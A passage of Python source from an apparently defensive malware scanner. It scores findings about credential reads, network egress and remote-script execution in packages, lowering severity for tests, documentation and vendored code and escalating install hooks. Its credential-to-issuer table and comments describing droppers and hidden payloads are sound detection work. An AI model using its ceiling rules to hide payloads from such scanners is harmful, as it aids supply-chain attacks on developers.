        ((b"DOCKER_TOKEN", b"DOCKERHUB_TOKEN"), (b"docker.io", b"index.docker.io")),
        ((b"AWS_SECRET_ACCESS_KEY", b"AWS_SESSION_TOKEN"), (b"amazonaws.com",)),
    )

    HOST_IN_URL = re.compile(rb"https?://([A-Za-z0-9._-]{4,253})")

    @classmethod
    def _credential_reaches_its_own_issuer(
        cls, content: FileContent, window: list[CapabilityHit]
    ) -> bool:
        """Whether every credential here is being sent to the host that issued it.

        `vllm`'s `setup.py` asks GitHub which commit `main` is on, and
        authenticates so the request is not rate-limited:

            github_token = os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))
            curl_cmd += ["-H", f"Authorization: token {github_token}"]

        A credential read, an outbound request, and an install-time context --
        `MALWARE.EXFIL.001` at CRITICAL, in the MALICIOUS category, telling the
        reader to treat their host as compromised. `pytorch`'s `torch/hub.py`
        does the same thing for the same reason.

        Nothing is exfiltrated. The host being contacted is the one that issued
        the token, already knows it, and is the only party the token is good
        against. This is what the credential is for.

        Narrow on purpose, and in the safe direction: it takes effect only when
        EVERY host named in the window belongs to the issuer of EVERY credential
        named in it. A payload that reads `GITHUB_TOKEN` and posts it anywhere
        else names another host and is untouched -- which is the whole attack
        this rule exists to catch.
        """
        if not window:
            return False
        lines = content.line_starts
        first = min(h.byte_start for h in window)
        last = max(h.byte_end for h in window)
        del lines
        text = content.raw[first:last]
        if not text:
            return False

        hosts = {m.group(1).lower() for m in cls.HOST_IN_URL.finditer(text)}
        if not hosts:
            return False

        issuers: list[tuple[bytes, ...]] = []
        for names, owned in cls.ISSUER_HOSTS:
            if any(name in text for name in names):
                issuers.append(owned)
        if not issuers:
            return False

        def owned_by_some_issuer(host: bytes) -> bool:
            return any(
                host == owner or host.endswith(b"." + owner) for owned in issuers for owner in owned
            )

        return all(owned_by_some_issuer(host) for host in hosts)

    def _composite_finding(
        self,
        compiled: CompiledRule,
        unit: FileUnit,
        ctx: ScanContext,
        anchor: CapabilityHit,
        matched: tuple[Capability, ...],
        hits: list[CapabilityHit],
    ) -> Finding | None:
        rule = compiled.rule
        content = unit.content

        mode = Redactor.effective_mode(rule.evidence_policy, ctx.config.evidence)
        evidence = Redactor.build_evidence(content, anchor.byte_start, anchor.byte_end, mode)
        evidence = self._with_idiom_key(evidence, content, matched, hits)

        present = {h.capability for h in hits}
        in_hook = ctx.in_install_hook(content.path)

        severity = RiskScorer.apply_category_floor(rule.category, rule.severity)
        category = rule.category
        escalations: list[str] = []

        # Test material and documentation get a severity ceiling, the way the secrets
        # detector has always given them one. The composites had none, so a file
        # written to demonstrate a dangerous pattern was reported as though it were
        # one in production.
        #
        # `bandit/examples/marshal_deserialize.py` is the clearest case: a file whose
        # entire purpose is to be an example of unsafe deserialisation, in a security
        # tool's `examples/` directory, reported at HIGH as decode-and-execute. It is
        # not wrong about what the file does. It is wrong about what a reader should
        # do next. The same applies to Airflow's, pydantic's and scrapy's test files,
        # which were four of nineteen findings from one rule across eighteen
        # repositories.
        #
        # A ceiling and not a suppression, and the ordering matters: the install-hook
        # escalation below is applied AFTER, so a payload in a file that happens to sit
        # under `tests/` and runs at install time still reaches CRITICAL. The ceiling
        # is about where a pattern was written, and the hook is about when it runs.
        #
        # MALICIOUS is never ceilinged. A dropper in a fixture directory is still a
        # dropper, and "we have not fixed this yet" is not a coherent position to hold
        # about evidence of intent - which is the same reasoning the baseline applies.
        # A MALICIOUS claim about a CI script needs the fetch to be opaque.
        #
        # The composite admits `ci_hook` alongside `install_hook`, correctly: a
        # compromised pipeline running what it downloaded is a real, observed attack.
        # But an install hook runs on every consumer's machine, unprompted, while a CI
        # script runs only in the pipeline the project controls -- so for CI the
        # category rests entirely on the fetch being unreviewable, and a pinned one is
        # not.
        #
        # Withdrawn rather than demoted, and the rule id is why. `MALWARE.DROPPER.001`
        # reported with `category: suspicious` is self-contradictory: the id namespace
        # encodes the category, a consumer filtering on `MALWARE.*` gets it anyway, and
        # the taxonomy derives a threat domain from the prefix. The first attempt at
        # this demoted the category and left the id, which produced exactly that.
        #
        # Nothing is lost by withdrawing it. `SUSPECT.DROPPER.001` fires on the same
        # span, at a severity the evidence supports, with remediation a maintainer can
        # act on - copy the script into the repository, or verify a digest. What stops
        # being said is "treat the host as compromised and report the package to the
        # registry", which is advice about a package somebody installed and means
        # nothing to the owner of a `.buildkite` script.
        if (
            category is Category.MALICIOUS
            and not in_hook
            and ctx.in_ci_hook(content.path)
            and CapabilityDetector.PINNED_FETCH.search(
                CapabilityDetector._satisfying_region(content, hits)
            )
        ):
            return None

        ceilinged = ""
        ceiling = FIXTURE_CEILING
        # Nothing below excuses a file that hid its payload.
        #
        # Every ceiling in the chain makes one argument in different words: this
        # is not really code somebody wrote to run. Test material, documentation,
        # generated output, a vendored library, a minified bundle -- each says
        # "read it somewhere else, or do not read it at all". A run of thousands
        # of invisible characters defeats all of them at once, because none of
        # those things contains one and the only reason to write one is so that a
        # reader does not see it.
        #
        # `@aifabrix/miso-client` needed this. Its payload is 9,123 consecutive
        # variation selectors in `dist/express/error-types.js`, `eval`ed a few
        # lines later. `dist/` is generated output, so the finding came out at
        # MEDIUM and a gate passed it -- the second time in this release a noise
        # ceiling was found holding real malware below the line, after
        # `_is_minified` and the obfuscated Python it excused.
        smuggled = any(hit.rule_id == "CAP.INVISIBLE_SMUGGLING.001" for hit in hits)
        if category is not Category.MALICIOUS and not smuggled:
            if Capability.PERSIST in matched and is_machine_provisioning(content.raw, content.path):
                # A script that installs operating-system packages is provisioning a
                # machine, and provisioning a machine IS fetching software and
                # arranging for it to keep running. `ViktorUJ/cks` supplied twenty-one
                # of these -- download kubectl, write a kubelet drop-in, enable the
                # unit, append completion to `.bashrc` -- and
                # `stacksimplify/terraform-on-aws-ec2` seventy-seven copies of `yum
                # install httpd` plus `systemctl enable httpd`.
                #
                # Only the persistence composites, and deliberately so. A dropper is
                # not excused by the same reasoning: piping an unpinned remote script
                # into a shell is a choice a provisioning script still has to answer
                # for, and it is how the one real supply-chain exposure in this corpus
                # works. Nor does this reach an install hook, where the ceiling is
                # applied before the hook escalation and the hook still raises the
                # finding to critical -- which is the case where writing somebody
                # else's cron entry is the attack rather than the installation.
                ceilinged = "a script that provisions a machine"
            elif compiled.rule.id == self.CREDENTIAL_STORE_RULE and names_authentication(
                content.path
            ):
                # A file named for authentication, reading a credential store. See
                # `core.samples.names_authentication`; scoped to this one rule, because
                # its premise is a store "this component does not own".
                ceilinged = "a file whose name says it handles authentication"
            elif content.is_rule_material:
                # A rule set, or a test case annotated for one. `semgrep/semgrep-rules`
                # supplies `bash/curl/security/curl-eval.bash`, whose whole content is
                # the capability pair the rule next to it matches. See `core.samples`.
                ceilinged = "another analyser's rule material"
                ceiling = RULE_MATERIAL_CEILING
            elif is_test_material(content.path):
                ceilinged = "test material"
            elif is_documentation(content.path):
                ceilinged = "documentation"
            elif is_build_tooling(content.path) and Capability.FETCH_EXEC not in present:
                # Unless the file PIPES the network into an interpreter. The ceilings
                # here all rest on one claim -- that a pattern in these paths is
                # "usually written to be read rather than run" -- and a build recipe is
                # the one place where that is false: `curl ... | sh` in a Makefile runs
                # on every machine that builds the project. Without this the
                # `make-fetch-exec` corpus sample, whose entire content is that line,
                # came out at MEDIUM.
                ceilinged = "the project's own build and release tooling"
            elif is_generated_artefact(content.path):
                ceilinged = "generated build output"
            elif is_vendored(content.path):
                # Somebody else's code, committed. `jart/cosmopolitan` vendors CPython's
                # standard library at `third_party/python/Lib/`, and five of its findings
                # were the import machinery doing what the import machinery does --
                # `_bootstrap_external.py` decodes a pyc and executes it, `nntplib.py`
                # reads `.netrc`, `distutils/command/register.py` reads `.pypirc`.
                #
                # The secrets detector has ceilinged on this since it measured it; this
                # one was comparing every other kind of path and not that one. What it
                # says is that a capability in vendored code belongs to whoever wrote
                # the library, which is a different review from the one this report is.
                ceilinged = "vendored third-party code"
            elif CapabilityDetector._is_minified(content):
                ceilinged = "minified output"
        if ceilinged:
            severity = min(severity, ceiling)
            escalations.append(
                f"reported below its usual severity because it sits in {ceilinged}, "
                f"where a pattern like this is usually written to be read rather than run"
            )

        if in_hook:
            # This is the escalation that matters most in the whole engine. The
            # identical capability pair is ordinary in application code and is a
            # credential harvester in an install hook, because install-time code
            # runs unprompted, as the developer, with the developer's full
            # environment, before any test, review, container boundary or network
            # policy applies.
            escalations.append(
                "runs during install or build, as the user, before any other control"
            )
            severity = Severity.CRITICAL
            if (
                category is Category.SUSPICIOUS
                and {
                    Capability.CREDENTIAL,
                    Capability.EGRESS,
                }
                <= present
            ):
                category = Category.MALICIOUS
                escalations.append("reads credentials and reaches the network from an install hook")

        is_obfuscated = Capability.DECODE in present

        risk = ctx.scorer.score(
            severity,
            rule.confidence,
            ScoringContext(
                in_install_hook=in_hook,
                capabilities=frozenset(present),
                is_obfuscated=is_obfuscated,
            ),
        )

        contributing = tuple(
            f"{h.rule_id}@{h.line}"
            for h in sorted(hits, key=lambda h: h.byte_start)
            if h.capability in matched
        )

        return Finding(
            rule_id=rule.id,
            category=category,
            severity=severity,
            confidence=rule.confidence,
            message=rule.message,
            location=Location(
                path=content.path,
                line=anchor.line,
                column=content.column_of(anchor.byte_start),
                byte_start=anchor.byte_start,
                byte_end=anchor.byte_end,
                project=unit.project,
            ),
            evidence=evidence,
            remediation=rule.remediation,
            explanation=Explanation(
                summary=rule.title,
                matched_rule=rule.id,
                contributing=contributing,
                escalations=tuple(escalations),
            ),
            risk=risk,
            detector=self.id,
            rule_version=rule.version,
            rulepack=rule.rulepack,
            references=rule.references,
            capabilities=tuple(sorted(matched, key=lambda c: c.value)),
        )


__all__ = ["CapabilityDetector", "CapabilityHit"]
